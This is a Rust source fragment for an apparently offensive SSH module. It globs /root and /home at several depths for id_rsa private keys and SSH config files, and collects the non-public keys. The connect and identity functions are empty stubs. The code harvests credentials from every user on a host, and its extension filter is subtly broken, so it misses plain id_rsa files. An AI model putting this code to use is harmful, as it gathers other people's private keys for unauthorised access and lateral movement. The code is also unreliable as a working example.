use std::process::Command;
use std::path::PathBuf;
use std::fs;

use log::warn;


const ID_RSA_PATHS: [&str; 6] = ["/root/id_rsa*", "/root/**/id_rsa*", "/root/**/**/id_rsa*", "/home/id_rsa*", "/home/**/id_rsa*", "/home/**/**/id_rsa*"];
const SSH_CONFIG_PATHS: [&str; 2] = ["/home/**/.ssh/config", "/root/.ssh/config*"];


pub struct Session {
}

impl Session {
    pub fn connect() {
    }
}

pub struct Ssh {
    keys: Vec<PathBuf>,
}

impl Ssh {
    pub fn new() -> Ssh {
        Ssh {
            keys: Vec::new(),
        }
    }

    pub fn extract_id_rsa(&mut self) {
        for pattern in ID_RSA_PATHS.iter() {
            match glob::glob(pattern) {
                Ok(paths) => {
                    let privates = paths.into_iter()
                        .filter_map(|path| path.ok())
                        .filter(|path| {
                            path.extension()
                                .and_then(|extension| extension.to_str())
                                .map(|extension| !extension.ends_with("pub"))
                                .unwrap_or(false)
                        });

                    self.keys.extend(privates);
                },
                Err(err) => {
                    warn!("failed to glob: {}", err);
                },
            }
        }
    }

    pub fn extract_identity(&mut self) {
    }
}


// TODO: finish this
#[inline]
fn extract_identity() {
    let paths = SSH_CONFIG_PATHS.iter()
        .filter_map(|wildcard| {
            glob::glob(&wildcard)
                .ok()
                .map(|paths| paths.filter_map(|entry| entry.ok()).collect::<Vec<PathBuf>>())
        })
        .flatten()
        .collect::<Vec<PathBuf>>();
}



